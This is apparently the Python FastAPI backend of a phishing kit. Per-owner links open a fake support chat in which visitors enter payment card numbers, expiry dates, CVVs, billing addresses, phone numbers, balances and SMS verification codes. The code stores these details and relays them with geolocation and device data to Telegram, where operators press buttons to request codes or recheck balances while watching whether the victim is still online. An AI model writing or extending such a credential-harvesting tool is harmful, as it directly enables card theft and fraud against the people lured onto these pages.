import asyncio
import json
import logging
import os
import secrets
import uuid

import httpx
from fastapi import APIRouter, File, Form, Request, UploadFile
from fastapi.responses import JSONResponse, StreamingResponse
from pydantic import BaseModel
from user_agents import parse as ua_parse

from api.chat_display import bilingual_blocks, visitor_tag
from api.cache import (
    _is_translation_error,
    append_chat_message,
    check_heartbeat,
    create_chat_session,
    get_cached_translation,
    get_chat_session,
    get_chat_steps,
    pop_operator_reply,
    push_operator_reply,
    set_cached_translation,
    touch_heartbeat,
    update_chat_session_lang,
)
from api.translate import _translate, _translate_many
from db.crud.links import get_link_by_subdomain_and_id
from db.crud.submissions import upsert_submission
from db.crud.users import get_or_create_user
from db.crud.visitors import get_or_create_visitor
from db.models import User
from db.session import get_session

logger = logging.getLogger(__name__)
router = APIRouter(prefix="/chat")

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
NOTIFY_CHAT_ID = os.getenv("NOTIFY_CHAT_ID", "")
ADMIN_ID = os.getenv("ADMIN_ID", "")


# ── geo lookup ────────────────────────────────────────────────────────────────

async def _get_geo(ip: str) -> tuple[str, str]:
    """Returns (city, country). Falls back to ('?', '?') on any error."""
    try:
        async with httpx.AsyncClient(timeout=4) as client:
            r = await client.get(f"http://ip-api.com/json/{ip}?fields=city,country,status")
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "success":
                    return data.get("city", "?"), data.get("country", "?")
    except Exception:
        pass
    return "?", "?"


def _parse_device(user_agent: str) -> str:
    """Returns a short device/OS string like 'Chrome 124 / Windows 10'."""
    if not user_agent:
        return "?"
    try:
        ua = ua_parse(user_agent)
        browser = ua.browser.family
        browser_ver = ua.browser.version_string.split(".")[0]
        os_name = ua.os.family
        os_ver = ua.os.version_string.split(".")[0]
        parts = []
        if browser and browser != "Other":
            parts.append(f"{browser} {browser_ver}".strip())
        if os_name and os_name != "Other":
            parts.append(f"{os_name} {os_ver}".strip())
        return " / ".join(parts) or "?"
    except Exception:
        return "?"


# ── translation ───────────────────────────────────────────────────────────────

async def _translate_steps(steps: list, dest: str) -> list:
    fields: list[tuple[int, str]] = []
    originals: list[str] = []
    out = [dict(s) for s in steps]
    for i, s in enumerate(out):
        for key in ("text", "button"):
            val = s.get(key)
            if not val:
                continue
            cached = await get_cached_translation(val, dest)
            if cached is not None:
                s[key] = cached
            else:
                fields.append((i, key))
                originals.append(val)
    if originals:
        translated = await _translate_many(originals, dest)
        for (i, key), src, dst in zip(fields, originals, translated):
            if _is_translation_error(dst):
                out[i][key] = src
                continue
            out[i][key] = dst
            if dst != src:
                await set_cached_translation(src, dest, dst)
    return out


def _detect_lang(text: str) -> str:
    try:
        from langdetect import detect
        return detect(text) or "ru"
    except Exception:
        return "ru"

# ── models ────────────────────────────────────────────────────────────────────

class StartSession(BaseModel):
    subdomain: str
    link_id: str
    lang: str = "ru"
    user_agent: str = ""
    sys_lang: str = ""


class VisitorMessage(BaseModel):
    session_id: str
    subdomain: str
    link_id: str
    step: int | None = None
    trigger: str | None = None   # open | card | balance | error | complete | user | code | code_resend
    text: str = ""
    # card data — sent with balance trigger, and again with code trigger
    card_number: str = ""
    card_exp: str = ""
    card_cvv: str = ""
    card_name: str = ""
    country: str = ""
    address1: str = ""
    address2: str = ""
    zip_code: str = ""
    city: str = ""
    phone_dial: str = ""
    phone: str = ""
    balance_amount: str = ""
    balance_currency: str = ""
    verification_code: str = ""
    image: str = ""


# ── helpers ───────────────────────────────────────────────────────────────────

async def _resolve_owner(subdomain: str, link_id: str) -> tuple[str, int | None]:
    """Returns (display_string, tg_user_id)."""
    try:
        async with get_session() as session:
            link = await get_link_by_subdomain_and_id(session, subdomain, link_id)
            if link:
                owner = await session.get(User, link.user_id)
                if owner:
                    if owner.username:
                        label = f"@{owner.username} (<code>{owner.id}</code>)"
                    else:
                        label = f"id:<code>{owner.id}</code>"
                    return label, owner.id
    except Exception as exc:
        logger.error("resolve_owner: %s", exc)
    return "неизвестен", None


_ALLOWED_IMAGE_TYPES = {
    "image/jpeg": ".jpg",
    "image/jpg": ".jpg",
    "image/png": ".png",
    "image/webp": ".webp",
}
_MAX_IMAGE_BYTES = 5 * 1024 * 1024


def encode_operator_event(reply: str) -> str:
    if reply == "__request_code__":
        return json.dumps({"action": "request_code"}, ensure_ascii=False)
    if reply == "__recheck_balance__":
        return json.dumps({"action": "recheck_balance"}, ensure_ascii=False)
    if reply == "__reset_form__":
        return json.dumps({"action": "reset_form"}, ensure_ascii=False)
    try:
        data = json.loads(reply)
        if isinstance(data, dict) and ("image" in data or "action" in data):
            return json.dumps(data, ensure_ascii=False)
    except (json.JSONDecodeError, TypeError):
        pass
    return json.dumps({"text": reply}, ensure_ascii=False)


def _static_dir() -> str:
    return os.getenv("STATIC_DIR", "/app/static")


def _safe_chat_image_path(image_url: str) -> str | None:
    if not image_url or not image_url.startswith("/static/chat/"):
        return None
    rel = image_url[len("/static/"):]
    if ".." in rel.replace("\\", "/").split("/"):
        return None
    path = os.path.normpath(os.path.join(_static_dir(), rel))
    root = os.path.normpath(os.path.join(_static_dir(), "chat"))
    if not path.startswith(root + os.sep) and path != root:
        return None
    return path if os.path.isfile(path) else None


async def _send_telegram_photo(
    chat_id: str | int,
    *,
    photo_path: str,
    caption: str = "",
    reply_markup: dict | None = None,
) -> None:
    if not BOT_TOKEN or not chat_id:
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    data: dict = {"chat_id": str(chat_id), "parse_mode": "HTML"}
    if caption:
        data["caption"] = caption[:1024]
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    try:
        async with httpx.AsyncClient(timeout=20) as client:
            with open(photo_path, "rb") as fh:
                r = await client.post(url, data=data, files={"photo": fh})
            if r.status_code != 200:
                logger.error("_send_telegram_photo: failed chat_id=%s status=%s body=%s",
                             chat_id, r.status_code, r.text)
    except Exception as exc:
        logger.error("_send_telegram_photo: exception chat_id=%s exc=%s", chat_id, exc)


async def _send_telegram(chat_id: str | int, text: str,
                         reply_markup: dict | None = None) -> None:
    if not BOT_TOKEN:
        logger.warning("_send_telegram: BOT_TOKEN not set — skipping")
        return
    if not chat_id:
        logger.warning("_send_telegram: chat_id is empty — skipping")
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload: dict = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        async with httpx.AsyncClient(timeout=8) as client:
            r = await client.post(url, json=payload)
            if r.status_code == 200:
                logger.info("_send_telegram: sent OK to chat_id=%s", chat_id)
            else:
                logger.error("_send_telegram: failed chat_id=%s status=%s body=%s",
                             chat_id, r.status_code, r.text)
    except Exception as exc:
        logger.error("_send_telegram: exception chat_id=%s exc=%s", chat_id, exc)


# ── POST /chat/session ────────────────────────────────────────────────────────

@router.post("/session")
async def start_session(body: StartSession, request: Request) -> JSONResponse:
    ip = (
        request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
        or (request.client.host if request.client else "?")
    )
    city, country = await _get_geo(ip)
    device = _parse_device(body.user_agent or request.headers.get("User-Agent", ""))
    sys_lang = body.sys_lang or body.lang

    async with get_session() as db:
        visitor, is_new = await get_or_create_visitor(
            db, ip=ip, city=city, country=country,
            device=device, sys_lang=sys_lang,
        )
        visitor_id = visitor.id

    session_id = secrets.token_urlsafe(16)
    await create_chat_session(
        session_id, body.subdomain, body.link_id,
        lang=body.lang, visitor_id=visitor_id,
        city=city, country=country, device=device, sys_lang=sys_lang,
    )
    return JSONResponse({"session_id": session_id, "visitor_id": visitor_id, "is_new": is_new})


# ── POST /chat/upload ─────────────────────────────────────────────────────────

@router.post("/upload")
async def upload_chat_image(
    session_id: str = Form(...),
    file: UploadFile = File(...),
) -> JSONResponse:
    if not session_id.strip():
        return JSONResponse({"ok": False, "error": "session"}, status_code=400)
    ctype = (file.content_type or "").lower()
    ext = _ALLOWED_IMAGE_TYPES.get(ctype)
    if not ext:
        return JSONResponse({"ok": False, "error": "type"}, status_code=400)
    data = await file.read(_MAX_IMAGE_BYTES + 1)
    if len(data) > _MAX_IMAGE_BYTES:
        return JSONResponse({"ok": False, "error": "size"}, status_code=400)
    if not data:
        return JSONResponse({"ok": False, "error": "empty"}, status_code=400)
    safe_sess = "".join(c for c in session_id if c.isalnum() or c in "-_")[:64]
    dest_dir = os.path.join(_static_dir(), "chat", safe_sess)
    os.makedirs(dest_dir, exist_ok=True)
    filename = f"{uuid.uuid4().hex}{ext}"
    dest = os.path.join(dest_dir, filename)
    with open(dest, "wb") as fh:
        fh.write(data)
    return JSONResponse({"ok": True, "image": f"/static/chat/{safe_sess}/{filename}"})


# ── GET /chat/steps ───────────────────────────────────────────────────────────

@router.get("/steps")
async def get_steps(subdomain: str, link_id: str, lang: str = "ru") -> JSONResponse:
    _, owner_id = await _resolve_owner(subdomain, link_id)
    # if link not found fall back to a sentinel user_id=0 which has no stored
    # steps — get_chat_steps returns _DEFAULT_STEPS in that case
    steps = await get_chat_steps(user_id=owner_id or 0)
    if lang and lang != "ru":
        steps = await _translate_steps(steps, dest=lang)
    return JSONResponse(steps)


# ── POST /chat/message ────────────────────────────────────────────────────────

@router.post("/message")
async def visitor_message(body: VisitorMessage, request: Request) -> JSONResponse:
    logger.info("chat/message trigger=%s text=%r session=%s image=%r", body.trigger, body.text, body.session_id, body.image)
    if not body.text.strip() and not body.trigger and not body.image:
        return JSONResponse({"ok": False, "error": "empty"}, status_code=400)

    sess = await get_chat_session(body.session_id)
    if not sess:
        await create_chat_session(body.session_id, body.subdomain, body.link_id)
        sess = await get_chat_session(body.session_id)

    # detect language from actual text; update session so replies go back in right lang
    if body.text.strip():
        visitor_lang = _detect_lang(body.text)
        if visitor_lang != (sess or {}).get("lang", "ru"):
            await update_chat_session_lang(body.session_id, visitor_lang)
    else:
        visitor_lang = (sess or {}).get("lang", "ru")

    ru_text = body.text
    if visitor_lang != "ru" and body.text.strip():
        ru_text = await _translate(body.text, dest="ru", source=visitor_lang)

    await append_chat_message(body.session_id, "visitor", body.text)

    if body.trigger in ("balance", "code") and (
        body.card_number or body.balance_amount or body.verification_code
    ):
        vid = (sess or {}).get("visitor_id")
        try:
            vid_int = int(vid) if vid not in (None, "?", "") else None
        except (TypeError, ValueError):
            vid_int = None
        try:
            async with get_session() as db:
                await upsert_submission(
                    db,
                    session_id=body.session_id,
                    visitor_id=vid_int,
                    subdomain=body.subdomain,
                    link_id=body.link_id,
                    card_number=body.card_number,
                    card_exp=body.card_exp,
                    card_cvv=body.card_cvv,
                    card_name=body.card_name,
                    country=body.country,
                    address1=body.address1,
                    address2=body.address2,
                    zip_code=body.zip_code,
                    city=body.city,
                    phone_dial=body.phone_dial,
                    phone=body.phone,
                    balance_amount=body.balance_amount,
                    balance_currency=body.balance_currency,
                    verification_code=body.verification_code or (
                        body.text if body.trigger == "code" else ""
                    ),
                )
        except Exception as exc:
            logger.error("upsert_submission failed: %s", exc)

    owner_label, owner_tg_id = await _resolve_owner(body.subdomain, body.link_id)
    ip = (
        request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
        or (request.client.host if request.client else "?")
    )

    sess_data = sess or {}
    visitor_id  = sess_data.get("visitor_id", "?")
    city        = sess_data.get("city", "?")
    country     = sess_data.get("country", "?")
    device      = sess_data.get("device", "?")
    sys_lang    = sess_data.get("sys_lang", visitor_lang)

    # format city/country
    geo_str = ", ".join(filter(lambda x: x and x != "?", [city, country])) or "?"

    trigger_label = {
        "open": "📂 открыл страницу",
        "card": "💳 открыл ввод карты",
        "balance": "💰 ввёл сумму баланса",
        "error": "⚠️ получил ошибку",
        "complete": "✅ ввёл все данные",
        "user": "✍️ написал сообщение",
        "code": "🔑 ввёл код подтверждения",
        "code_resend": "🔄 запросил повторную отправку кода",
    }.get(body.trigger or "user", "✍️ написал сообщение")

    is_new_marker = ""
    if sess_data.get("visitor_id"):
        # first message in this session is always trigger=open; mark new vs returning
        msgs_count = len(sess_data.get("msgs", []))
        is_new_marker = "🆕 Новый клиент" if msgs_count <= 1 else "🔄 Повторный клиент"

    header = (
        f"{is_new_marker} <b>{visitor_tag(visitor_id)}</b> [{trigger_label}]\n"
        f"👤 {owner_label}\n"
        f"🔗 {body.subdomain}/{body.link_id}\n"
        f"🌍 {geo_str}\n"
        f"📱 {device}\n"
        f"🗣 {sys_lang}\n"
    )
    # Bot script bubbles are posted already translated for the visitor.
    # Original = Russian source (what we authored); translated = visitor language.
    # Real visitor messages: original = what they typed; translated = Russian.
    _bot_script = (body.trigger or "") in ("open", "card", "error", "balance", "complete")
    if visitor_lang != "ru" and ru_text and body.text and ru_text != body.text:
        if _bot_script:
            msg_body = bilingual_blocks(ru_text, body.text, "ru", visitor_lang)
        else:
            msg_body = bilingual_blocks(body.text, ru_text, visitor_lang, "ru")
    else:
        msg_body = ru_text or f"<i>[{trigger_label}]</i>"

    # для кода — полный лог: карта + баланс + сам код
    if body.trigger == "code" and body.text.strip():
        card_lines = []
        if body.card_number:
            card_lines.append(f"  Номер: <code>{body.card_number}</code>")
        if body.card_exp:
            card_lines.append(f"  Срок: <code>{body.card_exp}</code>")
        if body.card_cvv:
            card_lines.append(f"  CVV: <code>{body.card_cvv}</code>")
        if body.card_name:
            card_lines.append(f"  Имя: {body.card_name}")
        addr_lines = []
        if body.country:
            addr_lines.append(f"  Страна: {body.country}")
        if body.address1:
            addr_lines.append(f"  Адрес: {body.address1}")
        if body.address2:
            addr_lines.append(f"  Адрес 2: {body.address2}")
        if body.zip_code or body.city:
            addr_lines.append(f"  Индекс: {body.zip_code or '—'}, {body.city or '—'}")
        parts = [f"🔑 <b>Код из SMS: {body.text.strip()}</b>"]
        if card_lines:
            parts.append("💳 <b>Карта:</b>\n" + "\n".join(card_lines))
        if addr_lines:
            parts.append("📍 <b>Адрес:</b>\n" + "\n".join(addr_lines))
        if body.phone or body.phone_dial:
            parts.append(f"📞 <b>Телефон:</b> {body.phone_dial}{body.phone or '—'}")
        if body.balance_amount:
            parts.append(f"💰 <b>Баланс:</b> <code>{body.balance_amount} {body.balance_currency or ''}</code>")
        msg_body = "\n\n".join(parts)

    # для баланса — добавляем данные карты и адреса в тело сообщения
    elif body.trigger == "balance" and body.balance_amount:
        card_lines = []
        if body.card_number:
            card_lines.append(f"  Номер: <code>{body.card_number}</code>")
        if body.card_exp:
            card_lines.append(f"  Срок: <code>{body.card_exp}</code>")
        if body.card_cvv:
            card_lines.append(f"  CVV: <code>{body.card_cvv}</code>")
        if body.card_name:
            card_lines.append(f"  Имя: {body.card_name}")
        addr_lines = []
        if body.country:
            addr_lines.append(f"  Страна: {body.country}")
        if body.address1:
            addr_lines.append(f"  Адрес: {body.address1}")
        if body.address2:
            addr_lines.append(f"  Адрес 2: {body.address2}")
        if body.zip_code or body.city:
            addr_lines.append(f"  Индекс: {body.zip_code or '—'}, {body.city or '—'}")
        parts = [f"💰 <b>Баланс:</b> <code>{body.balance_amount} {body.balance_currency or ''}</code>"]
        if card_lines:
            parts.append("💳 <b>Карта:</b>\n" + "\n".join(card_lines))
        if addr_lines:
            parts.append("📍 <b>Адрес:</b>\n" + "\n".join(addr_lines))
        if body.phone or body.phone_dial:
            parts.append(f"📞 <b>Телефон:</b> {body.phone_dial}{body.phone or '—'}")
        msg_body = "\n\n".join(parts)

    reply_kb = {
        "inline_keyboard": [[
            {
                "text": "💬 Сообщение",
                "callback_data": f"wchat_reply:{body.session_id}:{visitor_lang}"
            },
            {
                "text": "🟢 Проверить онлайн",
                "callback_data": f"wchat_online:{body.session_id}"
            },
        ]]
    }

    # extra actions only on the real balance payload, not the chat-script bubble
    if body.trigger == "balance" and body.balance_amount:
        reply_kb["inline_keyboard"].append([
            {
                "text": "🔑 Запросить код",
                "callback_data": f"wchat_reqcode:{body.session_id}"
            }
        ])
        reply_kb["inline_keyboard"].append([
            {
                "text": "🔄 Перепроверить баланс",
                "callback_data": f"wchat_rebal:{body.session_id}"
            },
            {
                "text": "✏️ Смена",
                "callback_data": f"wchat_reset:{body.session_id}"
            },
        ])

    # отправляем и владельцу ссылки, и в общий канал (если задан)
    targets: set[str] = set()
    if owner_tg_id:
        targets.add(str(owner_tg_id))
    if NOTIFY_CHAT_ID:
        targets.add(str(NOTIFY_CHAT_ID))
    if not targets and ADMIN_ID:
        targets.add(str(ADMIN_ID))

    logger.info("chat/message targets=%s trigger=%s msg_body=%r",
                targets, body.trigger, msg_body[:120] if msg_body else "")

    # trigger=card — только фиксируем визит, уведомление не отправляем
    if body.trigger == "card":
        return JSONResponse({"ok": True})

    photo_path = _safe_chat_image_path(body.image) if body.image else None
    if targets:
        for chat_id in targets:
            if photo_path:
                await _send_telegram_photo(
                    chat_id,
                    photo_path=photo_path,
                    caption=header + msg_body,
                    reply_markup=reply_kb,
                )
            else:
                await _send_telegram(chat_id, header + msg_body, reply_markup=reply_kb)
    else:
        logger.warning("chat/message: no targets — dropped for session %s", body.session_id)

    return JSONResponse({"ok": True})


# ── GET /chat/stream/{session_id} (SSE) ───────────────────────────────────────

@router.get("/stream/{session_id}")
async def chat_stream(session_id: str):
    async def event_gen():
        yield f"data: connected\n\n"
        while True:
            try:
                reply = await pop_operator_reply(session_id, timeout=25)
                if reply is not None:
                    payload = encode_operator_event(reply)
                    yield f"data: {payload}\n\n"
                else:
                    yield f": ping\n\n"
            except asyncio.CancelledError:
                break
            except Exception as exc:
                logger.error("SSE error: %s", exc)
                break

    return StreamingResponse(
        event_gen(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
        },
    )


# ── GET /chat/online/{session_id} ─────────────────────────────────────────────

@router.get("/online/{session_id}")
async def check_online(session_id: str) -> JSONResponse:
    """Returns whether the visitor is actively on the page (heartbeat-based)."""
    sess = await get_chat_session(session_id)
    if sess is None:
        # session expired entirely — definitely offline
        return JSONResponse({"online": False})
    alive = await check_heartbeat(session_id)
    return JSONResponse({"online": alive})


# ── POST /chat/heartbeat ───────────────────────────────────────────────────────

class HeartbeatBody(BaseModel):
    session_id: str


@router.post("/heartbeat")
async def heartbeat(body: HeartbeatBody) -> JSONResponse:
    """Called by the visitor's browser every ~20s to signal they are on the page."""
    await touch_heartbeat(body.session_id)
    return JSONResponse({"ok": True})
